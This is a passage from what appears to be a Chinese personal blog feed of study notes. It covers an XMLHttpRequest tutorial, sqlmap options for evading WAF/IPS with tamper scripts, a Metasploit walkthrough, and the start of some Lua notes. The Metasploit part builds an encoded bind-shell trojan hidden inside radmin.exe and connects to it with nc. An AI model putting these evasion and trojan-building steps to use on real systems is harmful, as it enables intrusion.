<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">	<span class="comment">//创建XMLHttpRequest对象</span></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//创建请求行</span></span></span><br><span class="line"><span class="javascript">	a.open(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;a.php&quot;</span>);</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//将请求发送到服务器</span></span></span><br><span class="line">	a.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看见里面有username=admin&amp;password=admin<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201206193450.png"></p>
<h2 id="响应接受"><a href="#响应接受" class="headerlink" title="响应接受"></a>响应接受</h2><p>会用到<code>responseText</code>属性他是返回响应数据以字符串格式显示</p>
<table>
<thead>
<tr>
<th align="center">方法</th>
<th align="right">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>readyState</code></td>
<td align="right">0：请求未初始化1：服务器连接已建立2：请求已收到3：正在处理请求4：请求已完成且响应已就绪</td>
</tr>
</tbody></table>
<h3 id="不用属性接受返回的值"><a href="#不用属性接受返回的值" class="headerlink" title="不用属性接受返回的值"></a>不用属性接受返回的值</h3><p>如果不用任何东西他会在响应的数据内容里面，不会在页面上<br><strong>下面就看一下他会在数据内容里面</strong><br>实咧<br>a.php文件代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你好啊&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>a.html文件代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//创建XMLHttpRequest对象</span></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//创建请求行</span></span></span><br><span class="line"><span class="javascript">	a.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;a.php&quot;</span>);</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//将请求发送到服务器</span></span></span><br><span class="line">	a.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201207092604.png"></p>
<h3 id="接受他返回的值"><a href="#接受他返回的值" class="headerlink" title="接受他返回的值"></a>接受他返回的值</h3><p>会用到<code>responseText</code>属性他是返回响应数据以字符串格式显示<br>实咧</p>
<p>a.php文件代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;你好啊&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>a.html文件代码<br>下面用到<code>onload</code>事件当页面加载完蛋时候触发</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//创建XMLHttpRequest对象</span></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//创建请求行</span></span></span><br><span class="line"><span class="javascript">	a.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;a.php&quot;</span>);</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//页面加载完触发这个</span></span></span><br><span class="line"><span class="javascript">	a.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="comment">//responseText属性他是返回响应数据以字符串格式显示</span></span></span><br><span class="line">		alert(a.responseText);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//将请求发送到服务器</span></span></span><br><span class="line">	a.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201207093759.png"></p>
<h2 id="属性的使用"><a href="#属性的使用" class="headerlink" title="属性的使用"></a>属性的使用</h2><table>
<thead>
<tr>
<th align="center">方法</th>
<th align="right">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>readyState</code></td>
<td align="right">0：请求未初始化1：服务器连接已建立2：请求已收到3：正在处理请求4：请求已完成且响应已就绪</td>
</tr>
<tr>
<td align="center"><code>open(&quot;请求类型&quot;,&quot;URL&quot;)</code></td>
<td align="right">请求类型 GET 或 POST，url：文件位置</td>
</tr>
<tr>
<td align="center"><code>send()</code></td>
<td align="right">将请求发送到服务器，用于 GET 请求</td>
</tr>
<tr>
<td align="center"><code>send(string)</code></td>
<td align="right">将请求发送到服务器，用于 POST 请求</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>编程</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>4.任务096：SQLMAP自动注入绕过WAF , IPS</title>
    <url>/2019/11/24/4.%E4%BB%BB%E5%8A%A1096%EF%BC%9ASQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF%20,%20IPS/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="注射参数"><a href="#注射参数" class="headerlink" title="注射参数"></a>注射参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Injection:</span><br><span class="line">These options can be used to specify which parameters to test for,</span><br><span class="line">provide custom injection payloads and optional tampering scripts</span><br><span class="line"></span><br><span class="line">-p TESTPARAMETER    Testable parameter(s)</span><br><span class="line">--skip&#x3D;SKIP         Skip testing for given parameter(s)</span><br><span class="line">--skip-static       Skip testing parameters that not appear to be dynamic</span><br><span class="line">--param-exclude&#x3D;..  Regexp to exclude parameters from testing (e.g. &quot;ses&quot;)</span><br><span class="line">--param-filter&#x3D;P..  Select testable parameter(s) by place (e.g. &quot;POST&quot;)</span><br><span class="line">--dbms&#x3D;DBMS         Force back-end DBMS to provided value</span><br><span class="line">--dbms-cred&#x3D;DBMS..  DBMS authentication credentials (user:password)</span><br><span class="line">--os&#x3D;OS             Force back-end DBMS operating system to provided value</span><br><span class="line">--invalid-bignum    Use big numbers for invalidating values</span><br><span class="line">--invalid-logical   Use logical operations for invalidating values</span><br><span class="line">--invalid-string    Use random strings for invalidating values</span><br><span class="line">--no-cast           Turn off payload casting mechanism</span><br><span class="line">--no-escape         Turn off string escaping mechanism</span><br><span class="line">--prefix&#x3D;PREFIX     Injection payload prefix string</span><br><span class="line">--suffix&#x3D;SUFFIX     Injection payload suffix string</span><br><span class="line">--tamper&#x3D;TAMPER     Use given script(s) for tampering injection data</span><br></pre></td></tr></table></figure>
<h3 id="指定变量扫描"><a href="#指定变量扫描" class="headerlink" title="指定变量扫描"></a>指定变量扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-p&quot;要扫描的变量&quot;</span><br></pre></td></tr></table></figure>
<h3 id="排除指定的扫描参数"><a href="#排除指定的扫描参数" class="headerlink" title="排除指定的扫描参数"></a>排除指定的扫描参数</h3><p>参数<code>--skip</code>  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--level&#x3D;5 --skip&#x3D;&quot;要指定的头&quot;     应为要&gt;5才能扫描其他的参数</span><br></pre></td></tr></table></figure>
<h3 id="指定数据库类型"><a href="#指定数据库类型" class="headerlink" title="指定数据库类型"></a>指定数据库类型</h3><p>参数<code>--dbms</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--dbms&#x3D;&quot;要指定的数据库名&quot; </span><br><span class="line">下面是数据库名&lt;里面可以添加数据库版本的&gt;</span><br><span class="line">• MySQL &lt;5.0&gt;</span><br><span class="line">• Oracle &lt;11i&gt;</span><br><span class="line">• Microsoft SQL Server &lt;2005&gt;</span><br><span class="line">• PostgreSQL</span><br><span class="line">• Microsoft Access</span><br><span class="line">• SQLite</span><br><span class="line">• Firebird</span><br><span class="line">• Sybase</span><br><span class="line">• SAP MaxDB</span><br><span class="line">• DB2</span><br></pre></td></tr></table></figure>
<h3 id="指定系统"><a href="#指定系统" class="headerlink" title="指定系统"></a>指定系统</h3><p>参数<code>--os</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--os&#x3D;&quot;linux或者是windows&quot;</span><br></pre></td></tr></table></figure>
<h3 id="设置取值失效"><a href="#设置取值失效" class="headerlink" title="设置取值失效"></a>设置取值失效</h3><p>sqlmap默认通常 sqlmap 使用负值使参数取值失效。 id=13，使其失效： id=-13</p>
<ol>
<li>使用大数使参数值失效<br><code>--invalid-bignum</code> 使用大数使参数值失效。id=13，使其失效：id= 999999999</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--invalid-bignum </span><br></pre></td></tr></table></figure>
<ol start="2">
<li>使用布尔判断取值使其失效<br><code>--invalid-logical</code> 使用布尔判断取值使其失效id=13。id=13，使其失效：AND 18=19<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--invalid-logical</span><br></pre></td></tr></table></figure>
<h3 id="–no-cast"><a href="#–no-cast" class="headerlink" title="–no-cast"></a>–no-cast</h3>榨取数据时，sqlmap 将所有结果转换为字符串，并用空格替换 NULL 结果<br>老版本 mysql 数据库需要开启此开关<h3 id="关闭逃避"><a href="#关闭逃避" class="headerlink" title="关闭逃避"></a>关闭逃避</h3>默认出于混淆和避免出错的目的，在 payload 中用单引号界定字符串时，sqlmap 默认使用 char() 编码逃逸的方法替换字符串，躲避检查</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">正常发送SELECT &#39;foo&#39; 编码后发送SELECT CHAR(102)+CHAR(111)+CHAR(111)</span><br></pre></td></tr></table></figure>
<p>要是这样的目标可能无法识别所以可以关闭这个参数<code>--no-escape</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--no-escape</span><br></pre></td></tr></table></figure>
<h3 id="插入前缀和后缀"><a href="#插入前缀和后缀" class="headerlink" title="插入前缀和后缀"></a>插入前缀和后缀</h3><p>正常情况下发送<code>$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;</code><br>终端输入扫描&gt;<code>sqlmap -u &quot;http://1.1.1.1/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id  --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc“</code><br>修改后<code>query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND  (’abc’=’abc’) LIMIT 0, 1&quot;;</code></p>
<p>参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--prefix &quot;要插入前缀的内容&quot;  --suffix&quot;要插入后缀的内容&quot;</span><br></pre></td></tr></table></figure>
<h3 id="绕过安全机制想-WAF-IPS-等等等"><a href="#绕过安全机制想-WAF-IPS-等等等" class="headerlink" title="绕过安全机制想 WAF , IPS 等等等"></a>绕过安全机制想 WAF , IPS 等等等</h3><p>sqlmap是没有混淆来绕过安全防护的 所以目标网站就会吧sqlmap扫描过滤掉<br>sqlmap作者就单独开发了一个参数编写了许多脚本来绕过过滤<br>参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--tamper&#x3D;&quot;绕过的脚步&quot;</span><br></pre></td></tr></table></figure>
<p>参看脚本命令<code>dpkg -L sqlmap | grep tamper</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019112411422116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="侦测参数"><a href="#侦测参数" class="headerlink" title="侦测参数"></a>侦测参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Detection:</span><br><span class="line">These options can be used to customize the detection phase</span><br><span class="line"></span><br><span class="line">--level&#x3D;LEVEL       Level of tests to perform (1-5, default 1)</span><br><span class="line">--risk&#x3D;RISK         Risk of tests to perform (1-3, default 1)</span><br><span class="line">--string&#x3D;STRING     String to match when query is evaluated to True</span><br><span class="line">--not-string&#x3D;NOT..  String to match when query is evaluated to False</span><br><span class="line">--regexp&#x3D;REGEXP     Regexp to match when query is evaluated to True</span><br><span class="line">--code&#x3D;CODE         HTTP code to match when query is evaluated to True</span><br><span class="line">--smart             Perform thorough tests only if positive heuristic(s)</span><br><span class="line">--text-only         Compare pages based only on the textual content</span><br><span class="line">--titles            Compare pages based only on their titles</span><br></pre></td></tr></table></figure>
<h3 id="设置扫描等级"><a href="#设置扫描等级" class="headerlink" title="设置扫描等级"></a>设置扫描等级</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--levl&#x3D;&quot;要扫描的等级1-5&quot; </span><br></pre></td></tr></table></figure>
<p>级别探测语句在<code>/usr/share/sqlmap/data/xml/payloads</code>目录下</p>
<h3 id="设置扫描风险级别"><a href="#设置扫描风险级别" class="headerlink" title="设置扫描风险级别"></a>设置扫描风险级别</h3><p>扫描目标网站是有风险的应为可能会叫目标网站扫描挂掉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--risk&#x3D;&quot;要扫描的等级1-4&quot;</span><br></pre></td></tr></table></figure>
<p>Risk升高可造成数据被篡改等风险(update)</p>
<h3 id="参数-string-not-string-regexp-code-text-only-titles"><a href="#参数-string-not-string-regexp-code-text-only-titles" class="headerlink" title="参数--string, --not-string, --regexp, --code, --text-only, --titles"></a><code>参数--string, --not-string, --regexp, --code, --text-only, --titles</code></h3><p>页面比较，基于布尔的注入检测，依据返回页面内容的变化判断真假逻辑但有些页面随时间阈值变化，此时需要人为指定标识真假的字符串</p>
<h2 id="技巧参数"><a href="#技巧参数" class="headerlink" title="技巧参数"></a>技巧参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Techniques:</span><br><span class="line">These options can be used to tweak testing of specific SQL injection</span><br><span class="line">techniques</span><br><span class="line"></span><br><span class="line">--technique&#x3D;TECH..  SQL injection techniques to use (default &quot;BEUSTQ&quot;)</span><br><span class="line">--time-sec&#x3D;TIMESEC  Seconds to delay the DBMS response (default 5)</span><br><span class="line">--union-cols&#x3D;UCOLS  Range of columns to test for UNION query SQL injection</span><br><span class="line">--union-char&#x3D;UCHAR  Character to use for bruteforcing number of columns</span><br><span class="line">--union-from&#x3D;UFROM  Table to use in FROM part of UNION query SQL injection</span><br><span class="line">--dns-domain&#x3D;DNS..  Domain name used for DNS exfiltration attack</span><br><span class="line">--second-url&#x3D;SEC..  Resulting page URL searched for second-order response</span><br><span class="line">--second-req&#x3D;SEC..  Load second-order HTTP request from file</span><br></pre></td></tr></table></figure>
<p>扫描技术</p>
<ul>
<li>默认sqlmap都会使用</li>
<li>B: Boolean-based blind</li>
<li>E: Error-based</li>
<li>U: Union query-based</li>
<li>s: Stacked queries (检查文件系统、操作系统、注册表必须使用的)</li>
<li>T: Time-based blind</li>
</ul>
<h3 id="基于时间的注入检测"><a href="#基于时间的注入检测" class="headerlink" title="基于时间的注入检测"></a>基于时间的注入检测</h3><p>基于时间的注入检测相应延迟时间(默认5秒)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--time-sec</span><br></pre></td></tr></table></figure>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><h4 id="默认联合查询1-10列，随-–level-增加最多支持50列"><a href="#默认联合查询1-10列，随-–level-增加最多支持50列" class="headerlink" title="默认联合查询1-10列，随 –level 增加最多支持50列"></a>默认联合查询1-10列，随 –level 增加最多支持50列</h4><p>也可以指定查询第几列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">–union-cols 6-9			这个是只查询6到9列</span><br></pre></td></tr></table></figure>
<p>2.2联合查询默认使用 NULL<br>联合查询默认使用 NULL, 极端情况下 NULL 可能失败，此时可以手动指定数值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--union-char 123			就不是NULL了就是123了</span><br></pre></td></tr></table></figure>
<h3 id="攻击者控制了某DNS服务器情况下"><a href="#攻击者控制了某DNS服务器情况下" class="headerlink" title="攻击者控制了某DNS服务器情况下"></a>攻击者控制了某DNS服务器情况下</h3><p>攻击者控制了某DNS服务器，使用此功能可以提高数据榨取的速度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--dns-domain &quot;DNS服务器&quot; </span><br></pre></td></tr></table></figure>
<h3 id="另外页面出现结果"><a href="#另外页面出现结果" class="headerlink" title="另外页面出现结果"></a>另外页面出现结果</h3><p>有特殊的注入一个页面，结果在另外一个页面出现来sqlmap进行判断可以用下面这个参数 <code>--second-order</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-u &quot;要注入的地址&quot;   --second-order &quot;结果出现的地址&quot;</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>5. Metasploit之生成木马</title>
    <url>/2020/08/09/5.%20Metasploit%E4%B9%8B%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="再学Metasploit"><a href="#再学Metasploit" class="headerlink" title="再学Metasploit"></a>再学Metasploit</h2><h2 id="之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来"><a href="#之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来" class="headerlink" title="之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来"></a>之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来</h2><h2 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h2><p>exploit是指利用漏洞的一个过程，最终的目的是为了执行payloads<br>即使我们不使用payload直接发给目标进行执行也是可以实现执行payloads</p>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><ol>
<li>查看payloads</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041814491566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<ol start="2">
<li><code>use payload/windows/shell_bind_tcp</code>就拿个模块演示<br>客户端运行 payloads就在本地监听端口叫攻击者去连接拿到shell<br>下面就是他默认的配置，我们不需要修改<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418145231882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br>就可以生成<strong>payloads</strong>了<br>命令</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">generate</span><br></pre></td></tr></table></figure>
<p>下面生成的是ruby的16进行的payloads<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418150122745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3. 生成出来的ruby的16进行的payloads里面可能有坏字符，导致程序不能执行<br>长被称为坏字符\x00<br>过滤坏字符的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">generate -b &quot;要过滤的字符&quot;</span><br></pre></td></tr></table></figure>
<p>可以看到没有了<br><strong>发现文件变大了是应为编码后有可能1个字节变成2个字节了</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418151117255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现他使用了encoder<br>他是默认去选择优秀的encoder<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418151412150.png" alt="在这里插入图片描述"><br>4. 选择<strong>encoders</strong><br>查看有什么encoder<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show encoders</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418151828449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>手动指定encoder</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">generate -e x86&#x2F;nonalpha</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418152436484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5. 生成payload<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">generate -b &#39;\x00&#39; -f exe -e x86&#x2F;shikata_ga_nai -i 5 -k -x &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;radmin.exe -o &#x2F;1.exe</span><br></pre></td></tr></table></figure>
<p>-b 指定要踢出的坏字符<br>-f 指定输出的格式<br>-e指定的encoders<br>-i 加密次数<br>-k 运行中不会产生新的进程<br>-x 要借宿到哪个程序上<br>-o  要生成的文件<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418153811326.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041815394340.png" alt="在这里插入图片描述"></p>
<h2 id="被攻击端启动生成的1-exe"><a href="#被攻击端启动生成的1-exe" class="headerlink" title="被攻击端启动生成的1.exe"></a>被攻击端启动生成的1.exe</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418154310859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实已经执行了木马病毒<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418154418806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="kali的nc连接目标4444端口"><a href="#kali的nc连接目标4444端口" class="headerlink" title="kali的nc连接目标4444端口"></a>kali的nc连接目标4444端口</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418154611773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="其他补充NOP"><a href="#其他补充NOP" class="headerlink" title="其他补充NOP"></a>其他补充NOP</h2><p>NOP叫做no-operation 或 next operation<br>如果我们就像缓冲区溢出里面的能控制EIP寄存器（存储下一跳的CPU要执行的内存地址）的话，如果EIP寄存器（存储下一跳的CPU要执行的内存地址）不能准确到跳到准确的内存地址我们就可以用不NOP会执行而是往后滑，从而执行到要执行的部分<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">generate -P 要滑的长度</span><br></pre></td></tr></table></figure>


<h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>4，nmap，Lua语言</title>
    <url>/2020/08/30/4%EF%BC%8Cnmap%EF%BC%8CLua%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="书名诸神之眼NMAP-学习笔记"><a href="#书名诸神之眼NMAP-学习笔记" class="headerlink" title="书名诸神之眼NMAP 学习笔记"></a>书名诸神之眼NMAP 学习笔记</h2><p>输出<code>print(&quot;Hello&quot;)</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060810243891.png" alt="在这里插入图片描述"></p>
<h2 id="1-if"><a href="#1-if" class="headerlink" title="1.if"></a>1.if</h2><p>Lua认为false和nil为假，true和非nil为真。<br>和其他语言有点不同<br>为真才会执行then里面的，如果是假会跳过then里面的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (真)</span><br><span class="line">then</span><br><span class="line">print(&quot;会执行这个&quot;)</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<ol>
<li>true咧<br>代码</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;lua</span><br><span class="line">if  true</span><br><span class="line">then</span><br><span class="line">   print(&quot;Hello&quot;)</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>执行结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608103555206.png" alt="在这里插入图片描述"><br>2. false咧<br>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;lua</span><br><span class="line">if false</span><br><span class="line">then</span><br><span class="line">   print(&quot;Hello&quot;)</span><br><span class="line">end</span><br><span class="line">   print(&quot;Hello1111&quot;)</span><br></pre></td></tr></table></figure>
